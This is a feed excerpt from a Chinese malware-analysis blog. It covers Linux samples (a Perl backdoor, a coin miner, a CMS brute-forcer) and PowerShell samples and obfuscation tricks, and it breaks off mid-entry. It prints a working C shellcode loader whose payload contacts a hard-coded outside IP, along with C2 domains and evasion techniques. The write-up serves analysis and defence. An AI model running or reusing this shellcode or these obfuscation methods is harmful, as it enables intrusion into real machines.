    <link href="https://findream.github.io/2019/07/16/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF_23_linux%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%B0%8F%E7%BB%93/"/>
    <id>https://findream.github.io/2019/07/16/病毒分析技术_23_linux样本分析小结/</id>
    <published>2019-07-16T07:02:11.000Z</published>
    <updated>2019-08-14T12:03:27.862Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;没事看看linux~~~~学习学习。然后的重点是linux的调试，文件结构，机制。慢慢积累。<br><a id="more"></a></p><h1 id="0x1-Perl脚本样本"><a href="#0x1-Perl脚本样本" class="headerlink" title="0x1 Perl脚本样本"></a>0x1 Perl脚本样本</h1><h2 id="0x1-1-Perl调试"><a href="#0x1-1-Perl调试" class="headerlink" title="0x1.1 Perl调试"></a>0x1.1 Perl调试</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Perl是一个解释性语言，此处的调试器为自带的Perl调试器。具体调试指令如下：</p><ul><li>启动调试器-d：<code>perl -d Test.pl</code><br>  <img src="http://hacky.wang/blog/20190716/o1DgFc6rditl.png?imageslim" alt="mark"></li><li>插入断点 b：<code>b 行号/函数名 条件</code></li><li>查看断点 L：</li><li>删除断点 B：<code>B 行号</code></li><li>添加监视 w: <code>w $变量名</code></li><li>查看监视 p：<code>p $变量名</code></li><li>删除监视 W：<code>W $变量名</code></li><li>步入操作 s</li><li>步过操作 n</li><li>执行到返回 r</li><li>退出调试 q</li><li>参考自：<a href="https://www.cnblogs.com/royenhome/archive/2010/09/09/1822239.html" target="_blank" rel="external">https://www.cnblogs.com/royenhome/archive/2010/09/09/1822239.html</a></li></ul><h2 id="0x1-2-实例分析"><a href="#0x1-2-实例分析" class="headerlink" title="0x1.2 实例分析"></a>0x1.2 实例分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;得到样本是一个perl语言编写的脚本，没有加混淆，可读性比较好。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先判断文件/tmp/.Abe0ffdecac1a561be917bfded951a7a是否存在，以及当前进程正在运行<br>    <img src="http://hacky.wang/blog/20190716/Bt4NDhq93ku6.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着创建一个新进程，然后清空三个标准标志符，将之前创建的进程PID写入/tmp/.Abe0ffdecac1a561be917bfded951a7a<br>    <img src="http://hacky.wang/blog/20190716/2MUax55n5ru1.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190716/zIVjoDueJAaG.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;检测配置文件/usr/share/hplip/data/images/24x24/.rc是否存在。如果存在，解析文件中的休眠时间和Hash数据。读取数据暂存到$line变量中，然后利用sqlit函数进行以’,’符号为界限，进行字符串分割，得到onfigHash和DEFAULT_SLEEP_TIME<br>    <img src="http://hacky.wang/blog/20190716/WpN4C7LeO5sw.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将收集到的信息，经过加密，形成要发送给C2的数据串，根据返回的结果，解密得到向对应的命令。一共分为四种<code>needregr</code>|<code>newtask</code>|<code>notasks</code>|<code>newreconfig</code>。然后返回到MAIN<br>    <img src="http://hacky.wang/blog/20190716/8YM0N6zo0hIc.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据返回的结果，有m/needregr/ig命令，主要收集用户数据Post给C2，然后升级配置文件<br>    <img src="http://hacky.wang/blog/20190716/Dj0WdtinjDov.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;命令m/newtask/ig是主要是任务命令，主要的操作有Command Execution，Download Execute，Download Execute W Params，Uninstall，killcycle，Update Me<br>    <img src="http://hacky.wang/blog/20190716/i6ncImgAwuX4.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;m/notasks/ig参数是休眠参数。<br>    <img src="http://hacky.wang/blog/20190716/bf1NORLX0Gp7.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;参数m/newreconfig/ig为重置命令参数<br>    <img src="http://hacky.wang/blog/20190716/W7r4q8pyeWc9.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190716/m824ROntpI43.png?imageslim" alt="mark"></p><ul><li>IoC：808128d5fb6db3df1a842faeccd9226c</li><li>参考自：<a href="https://mp.weixin.qq.com/s/4t_6vZ4lpEKgViScQJpqDw" target="_blank" rel="external">https://mp.weixin.qq.com/s/4t_6vZ4lpEKgViScQJpqDw</a></li></ul><h1 id="0x2-CoinMiner-linux"><a href="#0x2-CoinMiner-linux" class="headerlink" title="0x2 CoinMiner_linux"></a>0x2 CoinMiner_linux</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;linux_c写的，直接拖到IDA中，发现首先检查<code>w.3ei.xyz</code>,<code>w.21-3n.xyz</code>,<code>http://w.21-2n.com</code>三个域名是否可用。<br>    <img src="http://hacky.wang/blog/20190730/Htvj0Tz6eeEq.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后检查<code>/etc/zigw</code>,<code>/tmp/zigw</code>,<code>etc/zjgw</code>是否存在，如果存在关闭进程，删除文件<br>    <img src="http://hacky.wang/blog/20190731/5vWDf3v5hNGY.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下载migrations，并设置777权限，降低可执行文件执行难度。检查进程列表是否存在其他挖矿进程，然后执行migrations<br>    <img src="http://hacky.wang/blog/20190731/tDrqKTIME3HW.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190731/J6Lcf3SGNSy5.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;检查crontab.sh是否存在<br>    <img src="http://hacky.wang/blog/20190731/uIAlcuOQaFkG.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kill syslog进程，xig进程，systemctI<br>    <img src="http://hacky.wang/blog/20190731/2Jc0TRerRd88.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修改host文件，以便访问挖矿网站<br>    <img src="http://hacky.wang/blog/20190731/F6u3KMwvmIBW.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;清空log，命令历史，mail，避免留下痕迹<br><img src="http://hacky.wang/blog/20190731/zi4cqYmXmSU1.png?imageslim" alt="mark"></p><ul><li>0e77987c190b005191d51474e87748ca72cf18ae359fccaab3d6891f541e37ad</li></ul><h1 id="0x3-WordPress爆破"><a href="#0x3-WordPress爆破" class="headerlink" title="0x3 WordPress爆破"></a>0x3 WordPress爆破</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据微步在线情报社区有一篇帖子：35000个WordPress站被攻陷（<a href="https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=1774" target="_blank" rel="external">https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=1774</a>）。通过对C2的溯源，关联到一个elf样本（<a href="https://s.threatbook.cn/report/file/0f4755f65c495d3711bf22271f85f1ee86da8b7a487e770f769af56e189be48c/?sign=history&amp;env=centos_7_x64" target="_blank" rel="external">https://s.threatbook.cn/report/file/0f4755f65c495d3711bf22271f85f1ee86da8b7a487e770f769af56e189be48c/?sign=history&amp;env=centos_7_x64</a>）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过readelf查看样本信息，发现是一个go语言写的elf样本。使用GolangHelper获取信息。<br>    <img src="http://hacky.wang/blog/20190812/oNFlrOtQ65sf.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先样本通过cat获取了系统的版本和CPU信息<br>    <img src="http://hacky.wang/blog/20190812/7T7zBw2TeNRE.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190812/t4rurkHK3GWx.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190812/nH4os1PIxYfB.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可能存在一个释放过程？？？？<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可能还存在一个创建进程的过程？？</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后判断程序是否正在运行<br>    <img src="http://hacky.wang/blog/20190812/Ltbw8n1fvJbV.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将获取到的系统版本和CPU信息发送给C2<br>    <img src="http://hacky.wang/blog/20190812/uHb5rCJz80gp.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;判断是否需要升级<br>    <img src="http://hacky.wang/blog/20190812/JsE44xv3gso5.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;初始化攻击模块，利用弱口令进行爆破攻击：设计的软件主要有brut，phpmyadmin，wordpress,WHM,Magento,Joomla,Drupal,Cpanel,Bitrix,Opencart<br>    <img src="http://hacky.wang/blog/20190812/y1fM53Wha8kq.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后开始执行爆破攻击<br>    <img src="http://hacky.wang/blog/20190812/KCAe3s3Qi7VA.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20190812/NGtoHiqfvIxY.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言&quot;&gt;&lt;/a&gt;0x0 前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;没事看看linux~~~~学习学习。然后的重点是linux的调试，文件结构，机制。慢慢积累。&lt;br&gt;
    
    </summary>
    
      <category term="病毒分析" scheme="https://findream.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>样本分析之Powershell</title>
    <link href="https://findream.github.io/2019/07/01/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF_22_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E4%B9%8BPowershell/"/>
    <id>https://findream.github.io/2019/07/01/病毒分析技术_22_样本分析之Powershell/</id>
    <published>2019-07-01T07:02:11.000Z</published>
    <updated>2019-08-23T08:46:24.764Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x1-常见混淆"><a href="#0x1-常见混淆" class="headerlink" title="0x1 常见混淆"></a>0x1 常见混淆</h1><ul><li>基于大小写 ：hacky—&gt;HaCky</li><li>基于字符分割：’Ha’+’Cky’—&gt;HaCky</li><li>插入变量：’{0}{1}’-f ‘Ha’,’Kay’—&gt;HaCky</li><li>反引号：H`aCky—&gt;HaCky</li><li>基于命令转换(字符串转化为命令)&amp;(HaCky)—&gt;HaCky</li><li>基于空格或者ASCII<a id="more"></a></li></ul><h1 id="0x2-勒索软件"><a href="#0x2-勒索软件" class="headerlink" title="0x2 勒索软件"></a>0x2 勒索软件</h1><ul><li>解混淆能清除发现是AES加密<br>  <img src="http://hacky.wang/blog/20190629/XqfP84ygBUqt.png?imageslim" alt="mark"></li></ul><h1 id="0x3-流量欺骗"><a href="#0x3-流量欺骗" class="headerlink" title="0x3 流量欺骗"></a>0x3 流量欺骗</h1><ul><li>1.宏病毒释放处宏代码，如文件macro.vbs，查看宏代码，发现一段base64编码之后的数据，然后调用powershell执行，怀疑是一个powershell脚本</li><li>2.通过解base得到一个ps1脚本代码，命名为ByPowershell.ps1</li><li>3.通过分析，可以发现ByPowershell.ps1，利用powershell执行了一次-nop -noni -enc 命令，目的在于隐秘执行<br>  <img src="http://hacky.wang/blog/20190626/0rstQItBCLi5.png?imageslim" alt="mark"></li><li>4.解base64编码，得到FromPowershell.ps1_,可以观察到是利用利用virtuallAlloc执行shellcode</li><li>如果发现ps1脚本里面有shellcode，只需要用C语言内联shellcode字节，然后调试即可。如下是shellcode利用脚本<figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">printf(<span class="string">"hhhhh\n"</span>);</div><div class="line"><span class="keyword">char</span> shellcode[] = &#123;<span class="string">'\xfc'</span>,<span class="string">'\xe8'</span>,<span class="string">'\x82'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x60'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe5'</span>,<span class="string">'\x31'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x64'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x50'</span>,<span class="string">'\x30'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x52'</span>,<span class="string">'\x0c'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x52'</span>,<span class="string">'\x14'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x72'</span>,<span class="string">'\x28'</span>,<span class="string">'\x0f'</span>,<span class="string">'\xb7'</span>,<span class="string">'\x4a'</span>,<span class="string">'\x26'</span>,<span class="string">'\x31'</span>,<span class="string">'\xff'</span>,<span class="string">'\xac'</span>,<span class="string">'\x3c'</span>,<span class="string">'\x61'</span>,<span class="string">'\x7c'</span>,<span class="string">'\x02'</span>,<span class="string">'\x2c'</span>,<span class="string">'\x20'</span>,<span class="string">'\xc1'</span>,<span class="string">'\xcf'</span>,<span class="string">'\x0d'</span>,<span class="string">'\x01'</span>,<span class="string">'\xc7'</span>,<span class="string">'\xe2'</span>,<span class="string">'\xf2'</span>,<span class="string">'\x52'</span>,<span class="string">'\x57'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x52'</span>,<span class="string">'\x10'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x4a'</span>,<span class="string">'\x3c'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x4c'</span>,<span class="string">'\x11'</span>,<span class="string">'\x78'</span>,<span class="string">'\xe3'</span>,<span class="string">'\x48'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd1'</span>,<span class="string">'\x51'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x59'</span>,<span class="string">'\x20'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd3'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x49'</span>,<span class="string">'\x18'</span>,<span class="string">'\xe3'</span>,<span class="string">'\x3a'</span>,<span class="string">'\x49'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x34'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd6'</span>,<span class="string">'\x31'</span>,<span class="string">'\xff'</span>,<span class="string">'\xac'</span>,<span class="string">'\xc1'</span>,<span class="string">'\xcf'</span>,<span class="string">'\x0d'</span>,<span class="string">'\x01'</span>,<span class="string">'\xc7'</span>,<span class="string">'\x38'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x75'</span>,<span class="string">'\xf6'</span>,<span class="string">'\x03'</span>,<span class="string">'\x7d'</span>,<span class="string">'\xf8'</span>,<span class="string">'\x3b'</span>,<span class="string">'\x7d'</span>,<span class="string">'\x24'</span>,<span class="string">'\x75'</span>,<span class="string">'\xe4'</span>,<span class="string">'\x58'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x58'</span>,<span class="string">'\x24'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd3'</span>,<span class="string">'\x66'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x0c'</span>,<span class="string">'\x4b'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x58'</span>,<span class="string">'\x1c'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd3'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x04'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd0'</span>,<span class="string">'\x89'</span>,<span class="string">'\x44'</span>,<span class="string">'\x24'</span>,<span class="string">'\x24'</span>,<span class="string">'\x5b'</span>,<span class="string">'\x5b'</span>,<span class="string">'\x61'</span>,<span class="string">'\x59'</span>,<span class="string">'\x5a'</span>,<span class="string">'\x51'</span>,<span class="string">'\xff'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x5f'</span>,<span class="string">'\x5f'</span>,<span class="string">'\x5a'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x12'</span>,<span class="string">'\xeb'</span>,<span class="string">'\x8d'</span>,<span class="string">'\x5d'</span>,<span class="string">'\x68'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x65'</span>,<span class="string">'\x74'</span>,<span class="string">'\x00'</span>,<span class="string">'\x68'</span>,<span class="string">'\x77'</span>,<span class="string">'\x69'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x69'</span>,<span class="string">'\x54'</span>,<span class="string">'\x68'</span>,<span class="string">'\x4c'</span>,<span class="string">'\x77'</span>,<span class="string">'\x26'</span>,<span class="string">'\x07'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x31'</span>,<span class="string">'\xdb'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\x3a'</span>,<span class="string">'\x56'</span>,<span class="string">'\x79'</span>,<span class="string">'\xa7'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x03'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\xbb'</span>,<span class="string">'\x01'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\xe8'</span>,<span class="string">'\xa7'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x2f'</span>,<span class="string">'\x4c'</span>,<span class="string">'\x37'</span>,<span class="string">'\x6c'</span>,<span class="string">'\x37'</span>,<span class="string">'\x46'</span>,<span class="string">'\x38'</span>,<span class="string">'\x51'</span>,<span class="string">'\x73'</span>,<span class="string">'\x64'</span>,<span class="string">'\x71'</span>,<span class="string">'\x4f'</span>,<span class="string">'\x68'</span>,<span class="string">'\x6b'</span>,<span class="string">'\x36'</span>,<span class="string">'\x43'</span>,<span class="string">'\x53'</span>,<span class="string">'\x39'</span>,<span class="string">'\x32'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x6b'</span>,<span class="string">'\x35'</span>,<span class="string">'\x41'</span>,<span class="string">'\x4a'</span>,<span class="string">'\x58'</span>,<span class="string">'\x57'</span>,<span class="string">'\x54'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x70'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x75'</span>,<span class="string">'\x4d'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x66'</span>,<span class="string">'\x48'</span>,<span class="string">'\x00'</span>,<span class="string">'\x50'</span>,<span class="string">'\x68'</span>,<span class="string">'\x57'</span>,<span class="string">'\x89'</span>,<span class="string">'\x9f'</span>,<span class="string">'\xc6'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x89'</span>,<span class="string">'\xc6'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x32'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x84'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x57'</span>,<span class="string">'\x53'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\xeb'</span>,<span class="string">'\x55'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x3b'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x96'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x0a'</span>,<span class="string">'\x5f'</span>,<span class="string">'\x68'</span>,<span class="string">'\x80'</span>,<span class="string">'\x33'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x04'</span>,<span class="string">'\x50'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x1f'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\x75'</span>,<span class="string">'\x46'</span>,<span class="string">'\x9e'</span>,<span class="string">'\x86'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\x2d'</span>,<span class="string">'\x06'</span>,<span class="string">'\x18'</span>,<span class="string">'\x7b'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x85'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x75'</span>,<span class="string">'\x08'</span>,<span class="string">'\x4f'</span>,<span class="string">'\x75'</span>,<span class="string">'\xd9'</span>,<span class="string">'\xe8'</span>,<span class="string">'\x4b'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x40'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x10'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x40'</span>,<span class="string">'\x00'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\x58'</span>,<span class="string">'\xa4'</span>,<span class="string">'\x53'</span>,<span class="string">'\xe5'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x93'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe7'</span>,<span class="string">'\x57'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x20'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x53'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\x12'</span>,<span class="string">'\x96'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe2'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x85'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x74'</span>,<span class="string">'\xcf'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x07'</span>,<span class="string">'\x01'</span>,<span class="string">'\xc3'</span>,<span class="string">'\x85'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x75'</span>,<span class="string">'\xe5'</span>,<span class="string">'\x58'</span>,<span class="string">'\xc3'</span>,<span class="string">'\x5f'</span>,<span class="string">'\xe8'</span>,<span class="string">'\x77'</span>,<span class="string">'\xff'</span>,<span class="string">'\xff'</span>,<span class="string">'\xff'</span>,<span class="string">'\x31'</span>,<span class="string">'\x33'</span>,<span class="string">'\x38'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x31'</span>,<span class="string">'\x32'</span>,<span class="string">'\x38'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x31'</span>,<span class="string">'\x39'</span>,<span class="string">'\x36'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x38'</span>,<span class="string">'\x34'</span>,<span class="string">'\x00'</span>,<span class="string">'\xbb'</span>,<span class="string">'\xf0'</span>,<span class="string">'\xb5'</span>,<span class="string">'\xa2'</span>,<span class="string">'\x56'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x00'</span>,<span class="string">'\x53'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>&#125;;</div><div class="line">DWORD oldProtect = <span class="number">0</span>;</div><div class="line">VirtualProtect(shellcode, <span class="keyword">sizeof</span>(shellcode), PAGE_EXECUTE_READWRITE,&amp;oldProtect);</div><div class="line">((<span class="keyword">void</span>(*)(<span class="keyword">void</span>))&amp;shellcode)();</div><div class="line">VirtualProtect(shellcode, <span class="keyword">sizeof</span>(shellcode), oldProtect, &amp;oldProtect);</div><div class="line">getchar();</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><h1 id="0x4-驱动人生样本"><a href="#0x4-驱动人生样本" class="headerlink" title="0x4 驱动人生样本"></a>0x4 驱动人生样本</h1><ul><li>1.得到样本g123.ps1，<code>Invoke-Expression</code>是一个可以将变量(字符串)当成可以执行的语句。正常情况下如果有此语句是不能显示代码语句的，但是我们可以使用<code>Write-Host</code>打印代码。在powershell中执行g123.ps1。可以发现代码被严重混淆。将其重定向输出成1.ps1即可<br>  <img src="http://hacky.wang/blog/20190629/E7015YVIThF9.png?imageslim" alt="mark"></li><li>2.但是仍然发现代码被混淆严重，但是可以发现代码的一些蛛丝马迹。看代码最后一行。它其中是以. (表达式)(表达式)来执行的。可以联想到Invoke-Expression。看到在&amp; ((GV ‘<em>mDr</em>‘).nAME[3,11,2]-joiN’’)之前有个管道符。使用<code>Out-File .\tmp.log</code>重定向即可。得到2.ps1<br>  <img src="http://hacky.wang/blog/20190629/3aIiKnEUJr3L.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190629/7Vgnc0a8TVuQ.png?imageslim" alt="mark"></li><li>2.ps1和1.ps1是一样的。使用<code>Out-File .\tmp.log</code>解决，得到3.ps1.</li><li>3.3.ps1换了一种混淆方式，但是处理是一样的。 <code>($sHELLiD[1]+$ShelLiD[13]+&#39;X&#39;)</code>可以猜测是IEX。解混淆得到4.ps1.<br>  <img src="http://hacky.wang/blog/20190629/uGmvm4Po1BuL.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190629/FHPzGfssxIKj.png?imageslim" alt="mark"><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2></li><li>遇到混淆了的powershell，除了常规的字符替换之类的方法，还有三种方法可以解混淆。<ul><li>1.遇上Base64加密的，可以将<code>Invoke-Expression</code>修改为<code>Write-Host</code>即可。</li><li>2.出现在结尾的IEX字段，这时候，可以利用输出重定向，使用<code>Out-File .\tmp.log</code>.<strong>重点是查看是否有管道符</strong></li><li>3.出现在起始部分IEX字段，例如<code>. ( $EnV:CoMsPec[4,26,25]-JoIN&#39;&#39;)(((&#39;[string]3CHav = U&#39;+&#39;ABUAB[string]....</code>。只需要修改语句为<code>Write-Host</code>即可。</li></ul></li><li>备注：解混淆需要活学活用。重点是寻找<code>Invoke-Expression</code>字段</li><li>参考：<a href="https://paper.seebug.org/826/" target="_blank" rel="external">https://paper.seebug.org/826/</a></li></ul><h1 id="0x5-MuddyWater样本"><a href="#0x5-MuddyWater样本" class="headerlink" title="0x5 MuddyWater样本"></a>0x5 MuddyWater样本</h1><ul><li>得到的样本属于宏病毒，通过对vb代码的分析，发现样本会向%tmp释放aulngr.vbe。并设置开机自启。<br>  <img src="http://hacky.wang/blog/20190823/VeyL8BeISw6L.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190823/wSkhC9d67Mov.png?imageslim" alt="mark"></li><li><p>将得到的vbe文件有Decode VBE解密。<a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/decode-vbe.py" target="_blank" 